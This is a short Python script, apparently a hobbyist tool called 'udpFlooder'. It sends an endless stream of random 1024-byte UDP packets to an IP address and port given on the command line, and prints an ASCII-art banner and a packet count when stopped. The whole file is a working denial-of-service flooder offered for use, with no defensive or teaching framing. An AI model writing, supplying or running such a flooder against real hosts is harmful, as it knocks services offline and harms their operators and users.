import socket
import random
import sys

try:
    dest_ip = sys.argv[1] # target ip
    dest_port = int(sys.argv[2])   # target port

except IndexError:
    print("""
______________________________________________________________________________
something is missing!
usage: python3 udpFlooder <ip> <port>
    """)


if len(sys.argv[1]) > 3 and len(sys.argv[2]) >= 2:

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    i = 0

    while True:
        try:
            i += 1
            sock.sendto(packet, (dest_ip, dest_port))
        except KeyboardInterrupt:

            print(f"""
                                    ░██
                                    ░██
░██    ░██  ░██████   ░████████  ░████████ ░██░████  ░██████    ░███████
░██    ░██       ░██  ░██    ░██    ░██    ░███           ░██  ░██
 ░██  ░██   ░███████  ░██    ░██    ░██    ░██       ░███████   ░███████
  ░██░██   ░██   ░██  ░██    ░██    ░██    ░██      ░██   ░██         ░██
   ░███     ░█████░██ ░██    ░██     ░████ ░██       ░█████░██  ░███████
_______________________________________________________________________________
packages sent: {i}
See you space cowboy!
""")
            exit()
else:

    print("_______________________________________________________________________________")
    print("usage: python3 udpFlooder <ip> <port>")
